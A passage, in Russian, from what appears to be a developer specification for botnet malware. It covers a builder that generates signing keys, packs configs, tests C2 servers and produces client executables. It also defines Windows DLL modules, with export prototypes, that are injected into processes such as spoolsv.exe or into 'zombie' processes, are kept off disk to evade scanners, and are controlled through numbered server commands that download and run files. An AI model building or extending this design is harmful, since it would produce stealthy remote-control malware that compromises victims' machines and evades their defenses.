10.8.4 Если после скачивания файла его хеш не совпадает с тем который получили от сервера, то надо отчитаться на сервер о результате команды с кодом 5.
10.8.5 Если провека по хешу прошла успешно - запустить исполняемый файл. Если системная функция возвращает ошибку, то надо отчитаться на сервер о результате команды с кодом 6. 

Билдер
1 Билдер должен иметь следующий функционал
1.1 Генерировать пару ключей (приват-паблик) для конфига. Ключ бинарно совместимые с BCRYPT_ECDSA_P384_ALGORITHM из библиотеки CNG компании Microsoft. На выходе два файла с публичным и приватным ключом в бинарном виде без преобразований.
1.2 Упаковывать произвольный файл в универсальный подписанный конфиг. Входные данные: оригинальный файл, приватный ключ конфига. На выходе: файл в котором универсальный подписанный конфиг
1.3 Извлекать оригинальные данные из универсального подписанного конфига с проверкой по публичному ключу конфига или без проверки. Входные данные: универсальный подписанный конфиг, публичный ключ конфига (если требуется проверка файла). На выходе: оригинальный файл
1.4 Расшифровывать универсальный подписанный конфиг. На выходе должен быть файл в котором 8 байтовый хидер, ориниальные данные и цифровая подпись. Входные данные: универсальный подписанный конфиг. На выходе: файл с 8 байтовым хидером и подписью
1.5 Проверять работоспособность сервера по паре ip-адрес и порт. Входные данные: публичный ключ конфига, ip:port севрера.
1.6 Тоже самое что и пункт 1.5, но по списку серверов. Входные данные: публичный ключ конфига, список ip:port севреров.
1.7 Генерировать клиента. Входные данные: публичный ключ конфига, основной конфиг клиента, оригинальный исполняемый файл-шаблон клиента. На выходе: exe-файл
2 Билдер должен быть оформлен как GUI-приложение для Windows или Linux.


Модули для Windows
1 Модуль для Windows - это DLL с несколькими экспортируемыми функциями.  DLL может загружаться уже в работающий процесс, либо загружаться в специально созданный процесс-зомби. При этом есть одно важное условие: тело модуля никогда не сохраняется на диск в открытом виде даже при непосредственном его запуске. Для долговременного хранения модулей следует их хранить в универсальном подписанном конфиге (в том виде, в котором они были скачаны с сервера) либо в каком-либо другом виде, чтобы исключить поиск модуля автоматическими сканерами.
2 Модуль запрашивается при первом использовании с сервера-модулей, через команду /5/ по его полному имени. Он находится внутри универсального подписанного конфига. После успешной загрузки модуль запрашивается повторно каждые 72 часа. Если попытка обновления модуля произошла неудачно, то она должна быть повторена через 30 минут. Самый первый запрос модуля с сервера модулей должен быть осуществлён в момент первого использования на боте.
3 Каждый модуль имеет неотъемлемое свойство - имя. Имя модуля соджержит только английские буквы. Любой модуль всегда содержит две версии: 32-битную и 64-битную. При запhосе модуля с сервера надо указать его имя и добавить "32" или "64". Например, имя модуля "qwerty", тогда 32 битная версия будет именоваться "qwerty32", а 64-битная будет именоваться "qwerty64". Имя модуля с добавлением цифр "32" или "64" составляют его полное имя. Пример запроса 32-битной версии модуля "xyz" - /test1/QWERTY_W617600.11223344556677889900AABBCCDDEEFF/5/xyz32/. 
4 На 64-битной системе запускаются только 64-битные версии модулей. Таким образом, 64-битная версия вышестоящей логики запрашивает только 64 битные версии модулей, 32-битная версия вышестоящей логики запрашивает только 32 битные версии модулей.
5 Модуль всегда работает только в одном экземпляре.
6 Модуль экспортирует следующие функции: Start, Control, Release, FreeBuffer. Все функции имеют конверцию вызова stdcall и экспортируются по именам.
6.1 Функция Start имеет следующий прототип:
PVOID Start(
	LPCSTR ModuleName,	
	LPCBYTE Arg,
	SIZE_T ArgLen,
	LPSTR ResultInfo,
	const ParentInfo* pParentData,
	PVOID EventCallback,
	PVOID EventCallbackContext,
	PVOID Reserved1);
Функция вызывается когда от сервера пришёл ctl "start"
ModuleName - имя модуля
Arg - аргумент команды start
ArgLen - размер параметр CtlArg в байтах
ResultInfo -буфер для результирующей строки ctl. Буфер имеет фиксированную длину 1024 байта
pParentData - информация о вышестоящей логике, управляется конфигом модуля
EventCallback - указатель на функцию обработчик событий.
EventCallbackContext - параметр-указатель, который должен быть передан в обработчик из модуля.
Функция в случае удачи возвращает описатель, который необходимо использовать при вызове функций Control и Release. В случае неудачи функция возвращает ноль.

typedef struct ParentInfo {
	CHAR ParentID[256];
	CHAR ParentGroup[64];
	CHAR SelfIP[64];
	LPCWSTR ParentFiles;
} ;
ParentID - полный ID клиента вышестоящей логики
ParentGroup - группирующий тег вышестоящей логики
SelfIP - внешний IP-адрес 
ParentFiles - не используется
Поля в структуре заполяются ботом в зависимости от его конфига (тег <needinfo>).
6.2 Функция Control имеет следующий прототип
BOOL Control (
	PVOID ModuleHandle,
	LPCSTR Ctl,	
	LPCBYTE CtlArg,
	SIZE_T CtlArgLen,
	LPSTR CtlResultInfo,
	PVOID* ppOutData,
	PDWORD pOutDataSize,
	LPCSTR pOutDataTag,	
	PVOID Reserved1);
Функция вызывается когда от сервера пришёл ctl отличающийся от "start" и "release"
ModuleHandle - описатель модуля, которое вернула функция Start.
Ctl - строка содержащая ctl к модулю
CtlArg - аргумент ctl к модулю
CtlArgLen - размер параметр CtlArg в байтах
ResultInfo -буфер для результирующей строки ctl. Буфер имеет фиксированную длину 1024 байта
ppOutData - указатель на переменную в которую будет сохранён указатель на буфер с выходными данными ctl (ctl_OutData)
pOutDataSize - указатель на переменную в которую будет сохранён размер данных в  буфере с выходными данными ctl
pOutDataTag - буфер для вспомогательного тега, который будет отправлен на сервер. Буфер имеет фиксированную длину 128 байт
Функция в случае удачи возвращает TRUE, в противном случае функция возвращает FALSE. В случае успеха если значение *ppOutData после вызова не равно нулю, то этот буфер должен быть освобождён через функцию FreeBuffer 
6.3 Функция Release имеет следующий прототип
VOID Release (
	PVOID ModuleHandle);
Функция реализует полное завершение работы модуля. В её задачи входит удаление всех ресурсов используемых в ходе работы модуля. Функция вызывается когда от сервера пришла команда "release".
6.4 Функция FreeBuffer имеет следующий прототип
VOID FreeBuffer (
	PVOID pMemory);
Функция освобождает буфер выделенный внутри функции Control (параметр ppOutData).
6.5 Обработчик событий имеет следующий пропотип
VOID EventCallback (
	PVOID ModuleHandle,
	LPCSTR EventName,	
	LPCSTR EventInfo,
	PVOID pOutData,
	DWORD OutDataSize,
	LPCSTR pOutDataTag,	
	PVOID Context);
ModuleHandle - описатель модуля, который вернула функция Start.
EventName - строка содержащая имя события. Максимальная длина 128 байт, лишнее должно быть отрезано
EventInfo -буфер со строкой ассоциированной с событием. Максимальная длина 1024 байта, лишнее должно быть отрезано.
pOutData - указатель на буфер с блоком данных, который будет отправлен на сервер
OutDataSize - размер данных в  буфере pOutData 
pOutDataTag - буфер для вспомогательного тега, который будет отправлен на сервер. Максимальная длина 128 байт, лишнее должно быть отрезано
Context - значение скопированное модулем из параметра EventCallbackContext в функции Start
В целях безопасности, параметр Context должен быть проверен на валидность, в связи чем вышестоящая логика должна вести массив соответствия пар ModuleHadle=Context. Как альтернатива - можно использовать только использовать одно значение Context на всех.
7 Модуль где-то посреди своего тела содержит свой конфиг. Конфиг представляет из себя xml в кодировке ANSI, обрамлённый с концов тегами "<moduleconfig>" и  "</moduleconfig>". Конфиг предназначен исключительно для вышестоящей логики и имеет следующий формат:
<moduleconfig>
<autostart>yes</autostart>
<autocontrol>
<control ctl="test1" arg="cXdlcnR5MTIzNDU2Nzg5MA=="/>
<control ctl="test2" arg="cXdlcnR5MTIzNDU2Nzg5MA=="/>
</autocontrol>
<processname>spoolsv.exe</processname>
<needinfo name="id"/>
<needinfo name="ip"/>
<needinfo name="parentfiles"/>
<autoconf>
<conf ctl="test1" file="qwerty" period="30"/>
<conf ctl="test2" file="123456" period="180"/>
</autoconf>
</moduleconfig> 
Если задан тег <autostart> и он равен "yes", то модуль запускается автоматически после каждого запуска вышестоящей логики.
Если задан тег <autocontrol>, то после вызова функции Start надо сразу же вызвать функцию Control по порядку с указанными crl и arg в тегах <control>. Значение атрибута arg надо перед передачей в функцию Control декодировать из base64.
Если указан тег <processname>, то модуль необходимо запустить в контексте запущенного процесса с указанным именем. Если такого процесса нет, то модуль не запускается. Если таких процессов больше одного, то он запускается в контексте первого из них. Если тега <processname> нет, то модуль запускается в процессе-зомби.
Если указан тег <autoconf>, то модулю необходимо передавать содержимое конфигов с сервера. Содержимое конфига передаётся через параметр CtlArg функции Control, перед передачей конфиг проверяется по цифровой подписи и расшифровывается. Максимальный размер конфига после расшифровки - 8 МБ. Атрибует "file" задаёт имя файла на сервере, файл запрашивается с помощью команды /5/. Атрибут period задаёт период получения конфига с сервера в минутах. Если в процессе получения с сервера файла с сервера, произошла ошибка (сервер недоступен, или файл не расшифровался или не проверился по цифровой подписи), то попытка повторяется через 30 секунд. Если произведено более 5 неудачных попыток получения конфига, то это сигнал вышестоящей логике о том, что ей надо сменить сервер. Первая передача конфигов модулю должна осуществляться сразу же после вызова функции Start, до вызова ctl указанных в теге <autocontrol>. Таким образом, сначала autoconf, а потом autocontrol.
Если указан тег needinfo с атрибутом name равным "id" в структуре ParentInfo передаваемой в функцию Start заполняются поля ParentID и ParentGroup. Если указан тег needinfo с атрибутом name равным "ip" в структуре ParentInfo передаваемой в функцию Start заполняется поле ParentIP. 
После обновления тела модуля, обновляются и параметры его конфига.
7.1 Если модуль помечен как автозапускаемый, то после запуска вышестоящей логики он должен быть запущен ещё до начала связи с сервером, как можно раньше. 
ВНИМАНИЕ: Если указаны теги <autoconf> и связи с серверм (ещё) нет и модулю ещё ни разу не передавались конфиги, то должны быть переданы те конфиги которые были запрошены в последнюю успешную попытку. В связи с этим вышестоящая логика должна хранить содержимое конфигов, после каждой успешного запроса с сервера (а также после успешной расшифровки и проверки по цифровой подписи). Если и таковых не имеется, никакие данные не передаются.
8 Управление модулем осуществляется через команду /62/. После выполнения любого ctl кроме "release" клиент должен отчитаться на сервер о её результатах. Если ctl отличается от start" и "release", то вызывается функция Control. Перед передачей аргумента функциям Start или Control необходимо его декодировать из base64.
Отчёт о результатах производится через команду /63/. Если функция Start или Control вернули 0 или FALSE, от отчёт об этом передаётся через команду /14/.
Отчёт через команду /14/ осуществляется в формате /14/<module name>/<ctl> <причина>/, где module name это имя модуля с суффиксом "32"/"64", ctl - наименование ctl. Причина указывается в виде строки кратко (содержимое строки с причиной на усмотрение разработчика, главные требования это краткость и информативность). Например, /14/xyz64/start fail/ - при работе с модулем xyz64 функция start вернула ноль, /14/xyz32/getinfo no_instance/ при работе с модулем xyz2 функция ctl getinfo не смог выполнится, потому что процесс с модулем был уничтожен.
8.1 При ctl="start" возможны следующие ситуации:
Модуль не был запущен - в этом случае модуль загружается в целевой процесс
Модуль был запущен, но его процесса уже не существует - в этом случае модуль загружается в целевой процесс (если указан тег processname в конфиге модуля, то никаких действий не производится) и вызывается функция Start.
Модуль был запущен, и его процесс существует - если указан тег processname в конфиге модуля, то вызывается функция Release модуля, после чего снова вызывается функция Start. Если тег processname не указан, то вызывается функция Release, после чего процесс-зомби уничтожается, создаётся новый процесс-зомби и вызывается функция Start.
8.2 При ctl="release" возможны следующие ситуации:
Модуль не был запущен - в этом случае никаких действий не производится
Модуль был запущен, но его процесса уже не существует - в этом случае никаких действий не производится, очищаются все структуры и данные связанные с модулем и считается, что не был запущен
Модуль был запущен, и его процесс существует - если указан тег processname в конфиге модуля, то вызывается функция Release модуля и более никаких действий не производится. Если тег processname не указан, то вызывается функция Release, после чего процесс-зомби уничтожается
8.3 При ctl не равном "release" и "start" возможны следующие ситуации:
Модуль не был запущен - в этом случае никаких действий не производится, отправляется отчёт на сервер через команду /14/
Модуль был запущен, но его процесса уже не существует - в этом случае никаких действий не производится, очищаются все структуры и данные связанные с модулем и считается, что не был запущен. Отправляется отчёт на сервер через команду /14/
Модуль был запущен, и его процесс существует - вызывается функция Control с сtl и переданными аргументами.
